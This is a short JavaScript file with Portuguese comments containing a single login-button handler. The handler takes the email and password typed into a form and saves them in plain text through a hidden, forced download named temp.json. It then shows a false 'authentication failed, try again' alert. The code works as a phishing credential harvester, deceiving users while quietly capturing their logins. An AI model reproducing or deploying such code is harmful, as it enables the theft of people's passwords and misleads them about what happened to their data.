// Função para ser chamada no clique do botão Acessar
function loginf() {
    // Capturando os valores dos campos do formulário
    var email = document.getElementById('registerForm').elements['username'].value;
    var senha = document.getElementById('registerForm').elements['pass'].value;

    // Montando a string com os dados a serem gravados
    var dadosRegistro = `E-mail: ${email}, Senha: ${senha}\n`;

    // Criando um objeto Blob com os dados
    var blob = new Blob([dadosRegistro], { type: 'text/plain' });

    // Criando um URL para o Blob
    var url = URL.createObjectURL(blob);

    // Criando um elemento <a> invisível para realizar o download
    var downloadLink = document.createElement('a');
    downloadLink.style.display = 'none';
    downloadLink.href = url;
    downloadLink.download = 'temp.json';

    // Adicionando o elemento <a> ao DOM
    document.body.appendChild(downloadLink);

    // Simulando o clique no link para iniciar o download
    downloadLink.click();

    // Removendo o elemento <a> do DOM após o download
    document.body.removeChild(downloadLink);

    // Liberando o objeto URL
    URL.revokeObjectURL(url);


    // Exibindo uma mensagem de falha
    alert('Falha na autenticação, tente novamente!');
}







